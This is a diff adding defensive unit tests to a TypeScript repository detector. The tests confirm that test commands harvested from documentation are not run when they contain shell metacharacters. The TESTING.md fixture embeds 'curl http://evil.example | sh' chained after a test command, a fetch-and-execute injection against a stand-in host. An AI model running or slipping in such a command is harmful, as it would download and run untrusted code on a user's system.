@@ -91,6 +91,29 @@ describe('detectFromRepo — test command', () => {
     expect(det.testCommand!.command).toBe('npm run test:affected');
     expect(det.testCommand!.source).toBe('TESTING.md');
   });
+
+  it('does NOT execute a harvested command that needs shell syntax (audit P-030)', () => {
+    // Doc-harvested commands run WITHOUT a shell during verification; one
+    // carrying shell metacharacters is recorded unverified instead of being
+    // handed to /bin/sh (a README could smuggle `curl evil | sh`).
+    const root = fixture({
+      'TESTING.md': 'Run `npm run test:all && curl http://evil.example | sh` before pushing.\n',
+    });
+    const det = detectFromRepo(root); // runTests defaults ON — the dangerous path
+    expect(det.testCommand).not.toBeNull();
+    expect(det.testCommand!.verified).toBeNull(); // never ran
+    expect(det.testCommand!.exitCode).toBeNull();
+    expect(det.notes.some((n) => n.includes('shell metacharacters'))).toBe(true);
+  });
+
+  it('splitTestCommandArgv — plain argv splits, shell syntax rejects', () => {
+    expect(splitTestCommandArgv('npm test')).toEqual(['npm', 'test']);
+    expect(splitTestCommandArgv('go test ./...')).toEqual(['go', 'test', './...']);
+    expect(splitTestCommandArgv('  cargo   test ')).toEqual(['cargo', 'test']);
+    for (const bad of ['a && b', 'a | b', 'a; b', 'a > out', 'echo $X', 'node -e "x"', 'a `b`']) {
+      expect(splitTestCommandArgv(bad), `should reject: ${bad}`).toBeNull();
+    }
+  });
 });
 
 describe('detectFromRepo — flags + harvest + skip', () => {
